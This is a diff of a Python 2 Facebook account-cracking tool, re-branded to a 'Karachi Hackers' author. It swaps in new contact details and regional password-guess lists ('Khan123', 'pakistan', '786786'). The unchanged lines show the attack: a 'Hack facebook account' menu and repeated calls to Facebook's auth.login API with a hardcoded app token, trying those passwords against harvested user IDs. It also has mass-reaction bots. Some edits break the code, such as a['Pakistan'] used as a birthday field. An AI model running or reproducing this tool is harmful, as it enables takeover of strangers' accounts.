@@ -1,5 +1,8 @@
 #!/usr/bin/python2
-# coding=utf-8
+#coding=utf-8
+#I Proud To Be Afridi
+#Karachi Hackers Team PK
+#AHK HACKER👈
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
 from multiprocessing.pool import ThreadPool
@@ -28,7 +31,7 @@ def exit():
 	os.system('clear')
 	print "\033[1;91m[!] Closing the tool..."
 	os.system('sleep 3 && clear')
-	os.system('xdg-open https://web.facebook.com/mkdirlove.git')
+	os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 	os.sys.exit()
         tool_main_function()
 
@@ -47,21 +50,21 @@ logo = """
 │   █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀     │\033[1;91m
 │   █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█      │\033[1;91m
 │   █      ▀▄▄▀█  ▀█▄▄▀  ▀█▄▄▀  ██▄█▀  ▀█▄█▀  ▀█▄█▀  █  ▀▄    │\033[1;91m
-│┏━┓┏┓╻┏━┓┏┓╻╻ ╻┏━┓┏━┓╻ ╻╻┏┓╻╻ ╻   ┏━┓╻ ╻╻╻  ╻┏━┓┏━┓╻┏┓╻┏━╸┏━┓│\033[1;91m
-│┣━┫┃┗┫┃ ┃┃┗┫┗┳┛┗━┓┣━┛┣━┫┃┃┗┫┏╋┛   ┣━┛┣━┫┃┃  ┃┣━┛┣━┛┃┃┗┫┣╸ ┗━┓│\033[1;91m
-│╹ ╹╹ ╹┗━┛╹ ╹ ╹ ┗━┛╹  ╹ ╹╹╹ ╹╹ ╹   ╹  ╹ ╹╹┗━╸╹╹  ╹  ╹╹ ╹┗━╸┗━┛│\033[1;91m
+│_______ _     _ _     _ _     _ _______ _______ _     _ _______  ______│\033[1;91m
+│|_____| |_____| |____/  |_____| |_____| |       |____/  |______ |_____/│\033[1;91m
+│|     | |     | |    \_ |     | |     | |_____  |    \_ |______ |    \_│\033[1;91m
 └─────────────────────────────────────────────────────────────┘\033[1;91m
 \033[1;97m╔═════════════════════════════════════════════════════════════╗
-\033[1;97m║\033[1;93m* \033[1;97mTeam    \033[1;91m: \033[1;96mAnonySphinx Philippines \033[1;97m                         ║
-\033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mJayson Cabrillas San Buenaventura \033[1;97m               ║
-\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/mkdirlove/FBTOOL\033[1;97m              ║
-\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://web.facebook.com/mkdirlove.git\033[0m\033[1;97m           ║
-\033[1;97m║\033[1;93m* \033[1;97mCredits \033[1;91m: \033[1;96m[Wrath] [Magizz] [SantriCyber] \033[1;97m                  ║
-\033[1;97m║\033[1;93m* \033[1;97mNotice \033[1;91m : \033[1;96mThis is not my own work, i just recoded it. \033[1;97m     ║
+\033[1;97m║\033[1;93m* \033[1;97mTeam    \033[1;91m: \033[1;96mKarachi Hackers PK  \033[1;97m                         ║
+\033[1;97m║\033[1;93m* \033[1;97mInsta   \033[1;91m: \033[1;96mahkhacker \033[1;97m               ║
+\033[1;97m║\033[1;93m* \033[1;97mTwitter  \033[1;91m: \033[1;96mhttps://twitter.com/Ahkhacker404?s=09\033[1;97m              ║
+\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://web.facebook.com/Markhor404\033[0m\033[1;97m           ║
+\033[1;97m║\033[1;93m* \033[1;97mWhatsapp \033[1;91m: \033[1;96m+1 (224)662-6396 \033[1;97m                  ║
+\033[1;97m║\033[1;93m* \033[1;97mNotice \033[1;91m : \033[1;96mI Am Not Responsible Any Miss Use \033[1;97m     ║
 \033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.1.0\033[0m                        \033[1;97m                    ║
 \033[1;97m╚═════════════════════════════════════════════════════════════╝"""
 
-# load #
+# load #AHK
 def load():
 	tiload = ['.   ','..  ','... ']
 	for o in tiload:
@@ -95,9 +98,9 @@ vuln = "\033[32mVuln"
 def tool_main_function():
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal Ahk login"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens Ahk login"
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit Ahk"
 	print "\033[1;97m║"
 	login_method = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if login_method =="":
@@ -225,7 +228,7 @@ def menu():
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m User information"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get Id/email/hp"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Hack facebook account               "
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot       "
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Ahk Post Rection     "
 	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Others           "
 	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Show token           "
         print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Update           "
@@ -268,7 +271,7 @@ def choices():
 		os.remove('out')
 	elif pick =="9":
 		os.system('rm -rf login.txt')
-		os.system('xdg-open https://www.facebook.com/rizz.magizz')
+		os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 		exit()
 	elif pick =="0":
 		exit()
@@ -1050,7 +1053,7 @@ def mini():
 								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 								menu_hack()
 							else:
-								mode = a['birthday']
+								mode = a['Pakistan']
 								pz4 = mode.replace('/', '')
 								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 								y = json.load(data)
@@ -1093,7 +1096,7 @@ def mini():
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
-												pz6 = "bintang123"
+												pz6 = "Khan123"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												y = json.load(data)
 												if 'access_token' in y:
@@ -1113,7 +1116,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
+														pz7 = "gull1122, khankhan, , afridiafridi, khan007, hacker007, 786786, playboy, doraemon, bahagia"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
@@ -1379,7 +1382,7 @@ def choices_super():
 									checkpoint.append(user+pass3)
 								else:
 									#Pass4
-									mode = b['birthday']
+									mode = b['Pakistan786']
 									pass4 = mode.replace('/', '')
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
@@ -1396,7 +1399,7 @@ def choices_super():
 											checkpoint.append(user+pass4)
 										else:
 											#Pass5
-											pass5 = "sayang123","sayangku123"
+											pass5 = "pakistan","india786"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -1412,7 +1415,7 @@ def choices_super():
 													checkpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "bintang123","bintang12345"
+													pass6 = "khankhan","baloach1122"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1430,7 +1433,7 @@ def choices_super():
 															#Pass7
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
 															b = json.loads(a.text)
-															pass7 = "1234567890","password123","michelle","someone","","iloveyou","princess","playboy"
+															pass7 = "1234567890","password123","michelle","kumar123","","iloveyou","princess","playboy"
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -1448,7 +1451,7 @@ def choices_super():
                                                                                                                                         #Pass8
                                                                                                                                          a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
                                                                                                                                          b = json.loads(a.text)
-                                                                                                                                         pass8 = "january","february","march","april","may","june","july","august","september","november","december"
+                                                                                                                                         pass8 = "singh1122","786786","janjan","shah786","hacker786","danger1122","king007","jutt123","ch12345","rana786","rana12345"
                                                                                                                                          data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                          q = json.load(data)
                                                                                                                                          if 'access_token' in q:
@@ -1865,13 +1868,13 @@ def menu_bot():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions group Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m BOT COMMENT Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BOT COMMENT group Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m AHK Reactions Target Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m AHK Reactions group Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m AHK COMMENT Target Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m AHK COMMENT group Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m AHK delete Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m AHK accept friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m AHK delete friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choose_bot()
